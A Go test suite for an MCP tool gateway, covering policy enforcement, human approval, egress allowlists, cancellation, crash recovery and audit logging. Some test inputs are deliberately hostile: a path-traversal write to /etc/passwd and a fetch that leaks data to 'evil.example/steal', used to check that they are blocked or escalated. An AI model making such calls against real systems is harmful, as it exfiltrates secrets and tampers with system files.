package mcp

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/whoisnjoguu/nexus-cli/pkg/audit"
	"github.com/whoisnjoguu/nexus-cli/pkg/hitl"
	"github.com/whoisnjoguu/nexus-cli/pkg/policy"
)

func toolNames(resp map[string]any) map[string]bool {
	res, _ := resp["result"].(map[string]any)
	tools, _ := res["tools"].([]any)
	out := map[string]bool{}
	for _, td := range tools {
		m, _ := td.(map[string]any)
		name, _ := m["name"].(string)
		out[name] = true
	}
	return out
}

func TestVersionNegotiation(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Version: "1.2.3", Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})

	cases := map[string]string{
		"2024-11-05": "2024-11-05",
		"2025-03-26": "2025-03-26",
		"2025-06-18": "2025-06-18",
		"2025-11-25": "2025-11-25",
		"1999-01-01": LatestProtocolVersion,
		"":           LatestProtocolVersion,
	}
	for req, want := range cases {
		r := g.c.call("initialize", map[string]any{"protocolVersion": req, "capabilities": map[string]any{}})
		res := r["result"].(map[string]any)
		if res["protocolVersion"] != want {
			t.Errorf("requested %q: got %v want %s", req, res["protocolVersion"], want)
		}
		info := res["serverInfo"].(map[string]any)
		if info["version"] != "1.2.3" || info["name"] != serverName {
			t.Errorf("serverInfo = %v", info)
		}
	}

	// The upstream saw our version and protocol.
	lines := readLines(filepath.Join(dir, "a.init"))
	if len(lines) == 0 {
		t.Fatal("upstream never initialized")
	}
	var init map[string]any
	if err := json.Unmarshal([]byte(lines[0]), &init); err != nil {
		t.Fatal(err)
	}
	if init["protocolVersion"] != LatestProtocolVersion {
		t.Errorf("upstream got protocol %v", init["protocolVersion"])
	}
	if ci := init["clientInfo"].(map[string]any); ci["version"] != "1.2.3" {
		t.Errorf("upstream clientInfo = %v", ci)
	}
	if st := g.srv.Status(); st[0].Protocol != LatestProtocolVersion {
		t.Errorf("status protocol = %q", st[0].Protocol)
	}
}

func TestCapabilitiesUnionAndToolList(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	r := g.initialize(nil)
	caps := r["result"].(map[string]any)["capabilities"].(map[string]any)
	for _, k := range []string{"tools", "resources", "prompts", "logging", "completions"} {
		if _, ok := caps[k]; !ok {
			t.Errorf("capability %s not advertised: %v", k, caps)
		}
	}
	if caps["tools"].(map[string]any)["listChanged"] != true {
		t.Errorf("tools.listChanged not advertised")
	}
	names := toolNames(g.c.call("tools/list", map[string]any{}))
	// The fake paginates tools in pages of 4: all 12 must be present.
	for _, n := range []string{"a__echo", "a__slow", "a__whoami", "mint_token"} {
		if !names[n] {
			t.Errorf("missing tool %s in %v", n, names)
		}
	}
	got := resultText(t, g.callTool("a__echo", map[string]any{"x": 1}))
	if !strings.Contains(got, `args={"x":1}`) {
		t.Errorf("echo = %q", got)
	}
}

func TestUpstreamEnvCwdDisabled(t *testing.T) {
	dir := t.TempDir()
	cwd := t.TempDir()
	spec := fakeSpec(t, dir, "a")
	spec.Env["FAKE_EXTRA"] = "hello-env"
	spec.Cwd = cwd
	off := fakeSpec(t, dir, "off")
	off.Disabled = true
	g := startGW(t, Config{Upstreams: []UpstreamSpec{spec, off}})
	g.initialize(nil)
	got := resultText(t, g.callTool("a__whoami", map[string]any{}))
	real, _ := filepath.EvalSymlinks(cwd)
	if got != cwd+"|hello-env" && got != real+"|hello-env" {
		t.Errorf("whoami = %q, want %s|hello-env", got, cwd)
	}
	st := g.srv.Status()
	if st[1].State != stateDisabled || st[1].Tools != 0 {
		t.Errorf("disabled upstream status = %+v", st[1])
	}
	if _, err := os.Stat(filepath.Join(dir, "off.starts")); err == nil {
		t.Error("disabled upstream was started")
	}
	if !isErrorResult(g.callTool("off__echo", map[string]any{})) {
		t.Error("disabled upstream tool should fail")
	}
}

func TestUpstreamSpecValidation(t *testing.T) {
	for _, spec := range []UpstreamSpec{
		{Name: "", Command: "x"},
		{Name: "a__b", Command: "x"},
		{Name: "a"},
		{Name: "a", Command: "x", URL: "http://x"},
	} {
		if _, err := New(Config{Upstreams: []UpstreamSpec{spec}, In: strings.NewReader(""), Log: &syncBuf{}}); err == nil {
			t.Errorf("spec %+v should be rejected", spec)
		}
	}
}

func TestArgsPolicyBlocksTraversal(t *testing.T) {
	dir := t.TempDir()
	eng := policy.NewEngine(policy.Policy{
		DefaultAction: policy.ActionDeny,
		Tools: []policy.Rule{
			{Match: policy.Match{Tool: "a__write_file", Args: map[string]string{"path": "/workspace/**"}}, Action: policy.ActionAllow},
		},
	})
	g := startGW(t, Config{Engine: eng, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)
	cases := []struct {
		path string
		ok   bool
	}{
		{"/workspace/notes.txt", true},
		{"/workspace/sub/dir/x.go", true},
		{"/workspace/../etc/passwd", false},
		{"/etc/passwd", false},
		{"/workspace2/x", false},
	}
	for _, c := range cases {
		r := g.callTool("a__write_file", map[string]any{"path": c.path, "content": "x"})
		if isErrorResult(r) == c.ok {
			t.Errorf("write %s: allowed=%v want %v (%s)", c.path, !isErrorResult(r), c.ok, resultText(t, r))
		}
	}
}

func TestFetchToolEgressAndTaintEscalation(t *testing.T) {
	dir := t.TempDir()
	var asked atomic.Value
	eng := policy.NewEngine(policy.Policy{
		DefaultAction:       policy.ActionDeny,
		EscalateWhenTainted: true,
		Egress:              policy.Egress{Allow: []string{"api.github.com"}},
		Tools: []policy.Rule{
			{Match: policy.Match{Tool: "fetch__echo"}, Action: policy.ActionAllow, Taints: []string{"secrets"}},
			{Match: policy.Match{Tool: "fetch__fetch"}, Action: policy.ActionAllow},
		},
	})
	approver := hitl.ApproverFunc(func(_ context.Context, req hitl.Request) hitl.Decision {
		asked.Store(req)
		return hitl.Deny
	})
	g := startGW(t, Config{Engine: eng, Approver: approver, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "fetch")}})
	g.initialize(nil)

	if r := g.callTool("fetch__fetch", map[string]any{"url": "https://evil.example/x"}); isErrorResult(r) {
		t.Fatalf("untainted fetch should pass: %v", r)
	}
	g.callTool("fetch__echo", map[string]any{"secret": true}) // taints the session
	r := g.callTool("fetch__fetch", map[string]any{"url": "https://evil.example/steal?d=1"})
	if !isErrorResult(r) || !strings.Contains(resultText(t, r), "human-in-the-loop") {
		t.Fatalf("tainted fetch to non-allowlisted host should escalate and be denied: %v", r)
	}
	req, _ := asked.Load().(hitl.Request)
	if req.Target != "evil.example/steal" {
		t.Errorf("approval target = %q", req.Target)
	}
	if r := g.callTool("fetch__fetch", map[string]any{"url": "https://api.github.com/repos"}); isErrorResult(r) {
		t.Errorf("tainted fetch to allowlisted host should pass: %v", r)
	}
	// A tool without a rule but with a URL falls back to the egress allowlist.
	if r := g.callTool("fetch__write_file", map[string]any{"endpoint": "https://elsewhere.example/"}); !isErrorResult(r) ||
		!strings.Contains(resultText(t, r), "egress allowlist") {
		t.Errorf("unlisted host should be denied by egress allowlist: %v", r)
	}
}

func TestSlowCallDoesNotBlockAndCancelPropagates(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)

	slowID, slowCh := g.c.start("tools/call", map[string]any{"name": "a__slow", "arguments": map[string]any{"ms": 20000}})
	fast := make(chan string, 1)
	go func() {
		_, ch := g.c.start("tools/call", map[string]any{"name": "a__echo", "arguments": map[string]any{"fast": true}})
		r := <-ch
		b, _ := json.Marshal(r)
		fast <- string(b)
	}()
	select {
	case r := <-fast:
		if !strings.Contains(r, "fast") {
			t.Fatalf("fast call = %s", r)
		}
	case <-slowCh:
		t.Fatal("slow call finished before the fast one")
	case <-time.After(10 * time.Second):
		t.Fatal("fast call blocked behind slow call")
	}
	select {
	case <-slowCh:
		t.Fatal("slow call should still be running")
	default:
	}

	waitUpstreamCall(t, dir, "a", "slow")
	g.c.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/cancelled", "params": map[string]any{"requestId": slowID, "reason": "user"}})
	eventually(t, 10*time.Second, "upstream cancellation", func() bool {
		for _, l := range readLines(filepath.Join(dir, "a.cancelled")) {
			if strings.HasSuffix(l, "cancelled by client") {
				return true
			}
		}
		return false
	})
	select {
	case r := <-slowCh:
		t.Fatalf("cancelled request must not get a response: %v", r)
	case <-time.After(200 * time.Millisecond):
	}
	// The gateway is still responsive.
	if isErrorResult(g.callTool("a__echo", map[string]any{})) {
		t.Fatal("echo after cancel failed")
	}
}

func TestCallTimeout(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{CallTimeout: 300 * time.Millisecond, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)
	start := time.Now()
	r := g.callTool("a__slow", map[string]any{"ms": 20000})
	if !isErrorResult(r) || !strings.Contains(resultText(t, r), "timed out") {
		t.Fatalf("expected timeout error, got %v", r)
	}
	if time.Since(start) > 5*time.Second {
		t.Fatalf("timeout took %s", time.Since(start))
	}
	eventually(t, 5*time.Second, "timeout cancellation upstream", func() bool {
		for _, l := range readLines(filepath.Join(dir, "a.cancelled")) {
			if strings.HasSuffix(l, "timed out") {
				return true
			}
		}
		return false
	})
}

func TestProgressAndLogForwarded(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)
	_, ch := g.c.start("tools/call", map[string]any{"name": "a__progress", "arguments": map[string]any{}, "_meta": map[string]any{"progressToken": "tok-1"}})
	for i := 1; i <= 3; i++ {
		m := g.c.waitFor(5*time.Second, "progress", isMethod("notifications/progress"))
		p := m["params"].(map[string]any)
		if p["progressToken"] != "tok-1" || p["progress"] != float64(i) {
			t.Fatalf("progress %d = %v", i, p)
		}
	}
	m := g.c.waitFor(5*time.Second, "log message", isMethod("notifications/message"))
	if p := m["params"].(map[string]any); p["logger"] != "a" || p["data"] != "hello from a" {
		t.Errorf("message = %v", p)
	}
	if r := g.c.await(ch, 5*time.Second); resultText(t, r) != "progress done" {
		t.Errorf("progress result = %v", r)
	}
	// The client's progress token reaches the upstream unchanged.
	r := g.c.call("tools/call", map[string]any{"name": "a__echo", "arguments": map[string]any{}, "_meta": map[string]any{"progressToken": "tok-9"}})
	if txt := resultText(t, r); !strings.Contains(txt, `meta={"progressToken":"tok-9"}`) {
		t.Errorf("upstream saw %q", txt)
	}
}

func TestProgressTokenCollision(t *testing.T) {
	s := newServer(nil, false, strings.NewReader(""), io.Discard, io.Discard)
	u := &upstream{name: "a"}
	var got1, got2 []any
	rel := func(dst *[]any) *relation {
		return &relation{out: sinkFunc(func(v any) error {
			*dst = append(*dst, v.(outgoing).Params.(map[string]any)["progressToken"])
			return nil
		})}
	}
	p1 := map[string]any{"_meta": map[string]any{"progressToken": json.Number("7")}}
	p2 := map[string]any{"_meta": map[string]any{"progressToken": json.Number("7")}}
	done1 := s.trackProgress(u, p1, rel(&got1))
	done2 := s.trackProgress(u, p2, rel(&got2))
	tok1 := p1["_meta"].(map[string]any)["progressToken"]
	tok2 := p2["_meta"].(map[string]any)["progressToken"]
	if tok1 != json.Number("7") || tok2 == tok1 {
		t.Fatalf("tokens %v %v", tok1, tok2)
	}
	s.forwardProgress(u, mustJSON(map[string]any{"progressToken": tok1, "progress": 1}))
	s.forwardProgress(u, mustJSON(map[string]any{"progressToken": tok2, "progress": 1}))
	s.forwardProgress(&upstream{name: "b"}, mustJSON(map[string]any{"progressToken": tok1, "progress": 1}))
	if len(got1) != 1 || len(got2) != 1 || got1[0] != json.Number("7") || got2[0] != json.Number("7") {
		t.Errorf("routed %v / %v", got1, got2)
	}
	done1()
	done2()
	if len(s.progress) != 0 {
		t.Errorf("routes leaked: %v", s.progress)
	}
}

type sinkFunc func(any) error

func (f sinkFunc) send(v any) error { return f(v) }

func TestToolsListChangedRefresh(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)
	if toolNames(g.c.call("tools/list", map[string]any{}))["a__extra"] {
		t.Fatal("extra tool present too early")
	}
	g.callTool("a__change_tools", map[string]any{})
	g.c.waitFor(5*time.Second, "tools/list_changed", isMethod("notifications/tools/list_changed"))
	eventually(t, 5*time.Second, "extra tool", func() bool {
		return toolNames(g.c.call("tools/list", map[string]any{}))["a__extra"]
	})
	if got := resultText(t, g.callTool("a__extra", map[string]any{})); got != "extra ok" {
		t.Errorf("extra = %q", got)
	}
}

func TestSamplingGatedAndRelayed(t *testing.T) {
	dir := t.TempDir()

	t.Run("denied", func(t *testing.T) {
		// The default policy HITLs sampling; a__sample itself is allowed explicitly.
		eng := policy.NewEngine(policy.Policy{DefaultAction: policy.ActionHITL, Tools: append([]policy.Rule{
			{Match: policy.Match{Tool: "a__sample"}, Action: policy.ActionAllow},
		}, policy.DefaultPolicy().Tools...)})
		g := startGW(t, Config{Engine: eng, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
		g.initialize(map[string]any{"sampling": map[string]any{}})
		var got atomic.Bool
		g.c.setHandler(func(m map[string]any) (any, map[string]any) {
			if m["method"] == "sampling/createMessage" {
				got.Store(true)
			}
			return map[string]any{}, nil
		})
		txt := resultText(t, g.callTool("a__sample", map[string]any{}))
		if !strings.Contains(txt, `"code":-1`) || !strings.Contains(txt, "denied") {
			t.Errorf("upstream should get a rejection: %s", txt)
		}
		if got.Load() {
			t.Error("denied sampling request reached the client")
		}
	})

	t.Run("approved", func(t *testing.T) {
		approver := hitl.ApproverFunc(func(context.Context, hitl.Request) hitl.Decision { return hitl.Once })
		g := startGW(t, Config{Approver: approver, Engine: policy.NewEngine(policy.Policy{DefaultAction: policy.ActionAllow, Tools: []policy.Rule{
			{Match: policy.Match{Tool: "sampling/createMessage", Provider: "a"}, Action: policy.ActionHITL},
		}}), Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
		g.initialize(map[string]any{"sampling": map[string]any{}})
		g.c.setHandler(func(m map[string]any) (any, map[string]any) {
			if m["method"] != "sampling/createMessage" {
				return nil, map[string]any{"code": -32601, "message": "nope"}
			}
			return map[string]any{"role": "assistant", "content": map[string]any{"type": "text", "text": "generated!"}, "model": "m"}, nil
		})
		txt := resultText(t, g.callTool("a__sample", map[string]any{}))
		if !strings.Contains(txt, "generated!") {
			t.Errorf("sampling result not relayed: %s", txt)
		}
	})

	t.Run("client lacks capability", func(t *testing.T) {
		g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
		g.initialize(nil)
		txt := resultText(t, g.callTool("a__sample", map[string]any{}))
		if !strings.Contains(txt, "does not support sampling") {
			t.Errorf("expected capability error: %s", txt)
		}
	})
}

func TestRootsElicitPingRelay(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(map[string]any{"roots": map[string]any{"listChanged": true}, "elicitation": map[string]any{}})
	g.c.setHandler(func(m map[string]any) (any, map[string]any) {
		switch m["method"] {
		case "roots/list":
			return map[string]any{"roots": []any{map[string]any{"uri": "file:///w", "name": "w"}}}, nil
		case "elicitation/create":
			return map[string]any{"action": "accept", "content": map[string]any{"name": "bob"}}, nil
		case "ping":
			return map[string]any{}, nil
		}
		return nil, map[string]any{"code": -32601, "message": "nope"}
	})
	if txt := resultText(t, g.callTool("a__roots", map[string]any{})); !strings.Contains(txt, "file:///w") {
		t.Errorf("roots relay: %s", txt)
	}
	if txt := resultText(t, g.callTool("a__elicit", map[string]any{})); !strings.Contains(txt, `"bob"`) {
		t.Errorf("elicit relay: %s", txt)
	}
	if txt := resultText(t, g.callTool("a__ping_client", map[string]any{})); !strings.Contains(txt, `"result":{}`) {
		t.Errorf("ping relay: %s", txt)
	}
	g.c.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/roots/list_changed"})
	eventually(t, 5*time.Second, "roots list_changed forwarded", func() bool {
		for _, l := range readLines(filepath.Join(dir, "a.events")) {
			if l == "roots_changed" {
				return true
			}
		}
		return false
	})
}

func listAll(t *testing.T, g *gw, method, key string) ([]map[string]any, int) {
	t.Helper()
	var items []map[string]any
	cursor := ""
	pages := 0
	for {
		params := map[string]any{}
		if cursor != "" {
			params["cursor"] = cursor
		}
		r := g.c.call(method, params)
		res, ok := r["result"].(map[string]any)
		if !ok {
			t.Fatalf("%s: %v", method, r)
		}
		pages++
		list, _ := res[key].([]any)
		for _, it := range list {
			items = append(items, it.(map[string]any))
		}
		next, _ := res["nextCursor"].(string)
		if next == "" {
			return items, pages
		}
		cursor = next
		if pages > 50 {
			t.Fatal("pagination does not terminate")
		}
	}
}

func TestResourcesAndPromptsAcrossUpstreams(t *testing.T) {
	dir := t.TempDir()
	eng := policy.NewEngine(policy.Policy{DefaultAction: policy.ActionAllow, Tools: []policy.Rule{
		{Match: policy.Match{Tool: "resources/read", Args: map[string]string{"uri": "fake://a/r5"}}, Action: policy.ActionDeny},
		{Match: policy.Match{Tool: "prompts/get", Provider: "b", Args: map[string]string{"name": "p3"}}, Action: policy.ActionDeny},
	}})
	g := startGW(t, Config{Engine: eng, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a"), fakeSpec(t, dir, "b")}})
	g.initialize(nil)

	res, pages := listAll(t, g, "resources/list", "resources")
	if len(res) != 10 || pages != 6 {
		t.Fatalf("resources: %d items over %d pages", len(res), pages)
	}
	if res[0]["uri"] != "fake://a/r1" || res[9]["uri"] != "fake://b/r5" {
		t.Errorf("resource order: first %v last %v", res[0]["uri"], res[9]["uri"])
	}
	if r := g.c.call("resources/list", map[string]any{"cursor": "!!bad"}); r["error"] == nil {
		t.Error("bad cursor should error")
	}

	read := func(uri string) map[string]any { return g.c.call("resources/read", map[string]any{"uri": uri}) }
	r := read("fake://b/r3")
	if b, _ := json.Marshal(r); !strings.Contains(string(b), "content of fake://b/r3 from b") {
		t.Errorf("read routed wrong: %s", b)
	}
	// Unlisted URI: falls back across upstreams.
	if b, _ := json.Marshal(read("fake://b/unlisted")); !strings.Contains(string(b), "from b") {
		t.Errorf("fallback read: %s", b)
	}
	if r := read("fake://a/r5"); r["error"] == nil || int(r["error"].(map[string]any)["code"].(float64)) != codeDenied {
		t.Errorf("denied read: %v", r)
	}

	templates, _ := listAll(t, g, "resources/templates/list", "resourceTemplates")
	if len(templates) != 2 {
		t.Errorf("templates = %v", templates)
	}

	prompts, ppages := listAll(t, g, "prompts/list", "prompts")
	var pn []string
	for _, p := range prompts {
		pn = append(pn, p["name"].(string))
	}
	if strings.Join(pn, ",") != "a__p1,a__p2,a__p3,b__p1,b__p2,b__p3" || ppages != 4 {
		t.Errorf("prompts = %v over %d pages", pn, ppages)
	}
	pr := g.c.call("prompts/get", map[string]any{"name": "b__p2", "arguments": map[string]any{"x": "1"}})
	if b, _ := json.Marshal(pr); !strings.Contains(string(b), `b:p2:{\"x\":\"1\"}`) {
		t.Errorf("prompts/get = %s", b)
	}
	if r := g.c.call("prompts/get", map[string]any{"name": "b__p3"}); r["error"] == nil {
		t.Errorf("denied prompt: %v", r)
	}
	if r := g.c.call("prompts/get", map[string]any{"name": "nope"}); r["error"] == nil {
		t.Errorf("unknown prompt: %v", r)
	}

	comp := g.c.call("completion/complete", map[string]any{"ref": map[string]any{"type": "ref/prompt", "name": "b__p1"}, "argument": map[string]any{"name": "x", "value": ""}})
	if b, _ := json.Marshal(comp); !strings.Contains(string(b), "b-a") {
		t.Errorf("completion = %s", b)
	}

	g.c.call("logging/setLevel", map[string]any{"level": "debug"})
	for _, n := range []string{"a", "b"} {
		found := false
		for _, l := range readLines(filepath.Join(dir, n+".events")) {
			found = found || l == "level debug"
		}
		if !found {
			t.Errorf("setLevel not fanned out to %s", n)
		}
	}

	if r := g.c.call("resources/subscribe", map[string]any{"uri": "fake://a/r1"}); r["error"] != nil {
		t.Fatalf("subscribe: %v", r)
	}
	m := g.c.waitFor(5*time.Second, "resources/updated", isMethod("notifications/resources/updated"))
	if m["params"].(map[string]any)["uri"] != "fake://a/r1" {
		t.Errorf("updated = %v", m)
	}
}

func TestUpstreamCrashRestart(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}, tune: fastRestarts})
	g.initialize(nil)

	_, slowCh := g.c.start("tools/call", map[string]any{"name": "a__slow", "arguments": map[string]any{"ms": 30000}})
	// The gateway dispatches calls concurrently, so without this the crash can overtake the slow
	// call, which then fails on a dead pipe or a restarting upstream instead of as a pending call.
	waitUpstreamCall(t, dir, "a", "slow")
	start := time.Now()
	crash := g.callTool("a__crash", map[string]any{})
	slow := g.c.await(slowCh, 10*time.Second)
	if time.Since(start) > 8*time.Second {
		t.Fatalf("pending calls did not fail fast (%s)", time.Since(start))
	}
	for _, r := range []map[string]any{crash, slow} {
		if !isErrorResult(r) || !strings.Contains(resultText(t, r), "exited") {
			t.Errorf("expected exited error, got %v", r)
		}
	}
	g.c.waitFor(5*time.Second, "list_changed after crash", isMethod("notifications/tools/list_changed"))
	eventually(t, 10*time.Second, "restart", func() bool {
		st := g.srv.Status()[0]
		return st.State == stateUp && st.Restarts >= 1
	})
	g.c.waitFor(5*time.Second, "list_changed after restart", isMethod("notifications/tools/list_changed"))
	if !toolNames(g.c.call("tools/list", map[string]any{}))["a__echo"] {
		t.Fatal("tools not reloaded after restart")
	}
	if isErrorResult(g.callTool("a__echo", map[string]any{})) {
		t.Fatal("echo after restart failed")
	}
	if n := len(readLines(filepath.Join(dir, "a.starts"))); n != 2 {
		t.Errorf("starts = %d", n)
	}
}

func TestUpstreamGivesUpAfterMaxFailures(t *testing.T) {
	dir := t.TempDir()
	g := startGW(t, Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}, tune: fastRestarts})
	g.initialize(nil)
	if err := os.WriteFile(filepath.Join(dir, "a.crashstart"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	g.callTool("a__crash", map[string]any{})
	eventually(t, 15*time.Second, "down state", func() bool { return g.srv.Status()[0].State == stateDown })
	st := g.srv.Status()[0]
	if st.Restarts != g.srv.maxRestartFailures-1 || st.LastError == "" {
		t.Errorf("status = %+v", st)
	}
	if toolNames(g.c.call("tools/list", map[string]any{}))["a__echo"] {
		t.Error("down upstream's tools still listed")
	}
	r := g.callTool("a__echo", map[string]any{})
	if !isErrorResult(r) || !strings.Contains(resultText(t, r), "unavailable (down)") {
		t.Errorf("call to down upstream = %v", r)
	}
	// Max failures = 5: the crash plus 4 failed restarts.
	crashes := 0
	for _, l := range readLines(filepath.Join(dir, "a.starts")) {
		if l == "crash" {
			crashes++
		}
	}
	if crashes != g.srv.maxRestartFailures-1 {
		t.Errorf("restart attempts = %d", crashes)
	}
}

func TestDisableRestart(t *testing.T) {
	for name, cfg := range map[string]func(*Config){
		"config":   func(c *Config) { c.DisableRestart = true },
		"per-spec": func(c *Config) { c.Upstreams[0].NoRestart = true },
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			c := Config{Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}, tune: fastRestarts}
			cfg(&c)
			g := startGW(t, c)
			g.initialize(nil)
			g.callTool("a__crash", map[string]any{})
			eventually(t, 5*time.Second, "down", func() bool { return g.srv.Status()[0].State == stateDown })
			time.Sleep(200 * time.Millisecond)
			if st := g.srv.Status()[0]; st.Restarts != 0 || st.State != stateDown {
				t.Errorf("restarted despite no-restart: %+v", st)
			}
		})
	}
}

func TestOutOfBandApproval(t *testing.T) {
	dir := t.TempDir()
	broker := hitl.NewBroker(10 * time.Second)
	g := startGW(t, Config{Engine: policy.NewEngine(policy.DefaultPolicy()), Approver: broker, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil) // no elicitation

	_, ch := g.c.start("tools/call", map[string]any{"name": "a__echo", "arguments": map[string]any{"v": 1}})
	var pending []hitl.Request
	eventually(t, 5*time.Second, "pending approval", func() bool { pending = broker.Pending(); return len(pending) == 1 })
	if !strings.Contains(pending[0].Tool, "a__echo") {
		t.Errorf("pending = %+v", pending[0])
	}
	if !strings.Contains(g.logs.String(), "nexus-cli approve") {
		t.Error("no approval hint on stderr")
	}
	// Other requests keep flowing while the approval waits.
	if r := g.c.call("tools/list", map[string]any{}); r["result"] == nil {
		t.Fatal("tools/list blocked by pending approval")
	}
	if err := broker.Decide(pending[0].ID, hitl.Once); err != nil {
		t.Fatal(err)
	}
	if r := g.c.await(ch, 5*time.Second); isErrorResult(r) {
		t.Fatalf("approved call failed: %v", r)
	}

	// Denied out of band.
	_, ch = g.c.start("tools/call", map[string]any{"name": "a__echo", "arguments": map[string]any{"v": 2}})
	eventually(t, 5*time.Second, "pending approval", func() bool { pending = broker.Pending(); return len(pending) == 1 })
	_ = broker.Decide(pending[0].ID, hitl.Deny)
	if r := g.c.await(ch, 5*time.Second); !isErrorResult(r) {
		t.Fatalf("denied call ran: %v", r)
	}
}

func TestOutOfBandRacesElicitation(t *testing.T) {
	dir := t.TempDir()
	broker := hitl.NewBroker(10 * time.Second)
	g := startGW(t, Config{Engine: policy.NewEngine(policy.DefaultPolicy()), Approver: broker, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(map[string]any{"elicitation": map[string]any{}})
	elicited := make(chan any, 1)
	g.c.setHandler(func(m map[string]any) (any, map[string]any) {
		elicited <- m["id"]
		return nil, nil // never answer: the broker decides
	})
	_, ch := g.c.start("tools/call", map[string]any{"name": "a__echo", "arguments": map[string]any{}})
	var eid any
	select {
	case eid = <-elicited:
	case <-time.After(5 * time.Second):
		t.Fatal("no elicitation")
	}
	var pending []hitl.Request
	eventually(t, 5*time.Second, "pending approval", func() bool { pending = broker.Pending(); return len(pending) == 1 })
	_ = broker.Decide(pending[0].ID, hitl.Once)
	if r := g.c.await(ch, 5*time.Second); isErrorResult(r) {
		t.Fatalf("approved call failed: %v", r)
	}
	m := g.c.waitFor(5*time.Second, "elicitation cancelled", isMethod("notifications/cancelled"))
	if m["params"].(map[string]any)["requestId"] != eid {
		t.Errorf("cancelled %v, elicitation id %v", m["params"], eid)
	}
}

func TestApprovalTimeout(t *testing.T) {
	dir := t.TempDir()
	broker := hitl.NewBroker(time.Minute)
	g := startGW(t, Config{ApprovalTimeout: 200 * time.Millisecond, Engine: policy.NewEngine(policy.DefaultPolicy()), Approver: broker, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)
	if r := g.callTool("a__echo", map[string]any{}); !isErrorResult(r) {
		t.Fatalf("expected denial on approval timeout: %v", r)
	}
}

func TestAuditRecordsArgsHash(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(t.TempDir(), "audit.log")
	lg, err := audit.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = lg.Close() })
	eng := policy.NewEngine(policy.Policy{DefaultAction: policy.ActionDeny, Tools: []policy.Rule{
		{Match: policy.Match{Tool: "a__echo", Args: map[string]string{"a": "1"}}, Action: policy.ActionAllow},
		{Match: policy.Match{Tool: "a__whoami"}, Action: policy.ActionHITL},
	}})
	approver := hitl.ApproverFunc(func(context.Context, hitl.Request) hitl.Decision { return hitl.Once })
	g := startGW(t, Config{Audit: lg, Engine: eng, Approver: approver, Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	g.initialize(nil)
	rawArgs := `{"a":1,"b":2}`
	g.c.call("tools/call", json.RawMessage(`{"name":"a__echo","arguments":`+rawArgs+`}`))
	g.callTool("a__echo", map[string]any{"a": 2})
	g.callTool("a__whoami", map[string]any{})
	entries, err := audit.Tail(path, 10)
	if err != nil || len(entries) != 3 {
		t.Fatalf("entries = %v, %v", entries, err)
	}
	allow, deny, hitlE := entries[0], entries[1], entries[2]
	if allow.Target != "mcp:a__echo" || allow.Decision != "allow" || allow.ArgsHash != audit.HashArgs([]byte(rawArgs)) ||
		allow.Session != "stdio" || allow.Rule != "tool=a__echo args[a]=1 -> allow" || allow.Source != "policy" {
		t.Errorf("allow entry = %+v", allow)
	}
	if deny.Decision != "deny" || deny.ArgsHash == "" || deny.ArgsHash == allow.ArgsHash || deny.Rule != "" || deny.Source != "policy" {
		t.Errorf("deny entry = %+v", deny)
	}
	if hitlE.Decision != "allow" || hitlE.Source != "approve" || hitlE.Rule != "tool=a__whoami -> hitl" {
		t.Errorf("hitl entry = %+v", hitlE)
	}
}

func TestStatusFile(t *testing.T) {
	dir := t.TempDir()
	statusDir := filepath.Join(t.TempDir(), "mcp")
	g := startGW(t, Config{Version: "9.9.9", StatusDir: statusDir, PolicyPath: "/p/nexus.yaml", Upstreams: []UpstreamSpec{fakeSpec(t, dir, "a")}})
	files, err := ReadStatusFiles(statusDir)
	if err != nil || len(files) != 1 {
		t.Fatalf("status files = %v, %v", files, err)
	}
	f := files[0]
	if f.PID != os.Getpid() || f.Version != "9.9.9" || f.Policy != "/p/nexus.yaml" || len(f.Upstreams) != 1 ||
		f.Upstreams[0].State != stateUp || f.Upstreams[0].Tools != 12 || f.Upstreams[0].Transport != "stdio" {
		t.Errorf("status = %+v", f)
	}
	if f.Stale(time.Now()) || !f.Stale(time.Now().Add(time.Hour)) {
		t.Error("staleness check wrong")
	}
	if fi, _ := os.Stat(f.Path); runtime.GOOS != "windows" && fi.Mode().Perm() != 0o600 {
		t.Errorf("status file mode %v", fi.Mode())
	}
	g.srv.Close()
	if _, err := os.Stat(f.Path); !os.IsNotExist(err) {
		t.Error("status file not removed on Close")
	}
}

// Requests already read when stdin closes still get their responses (the host may pipe a script).
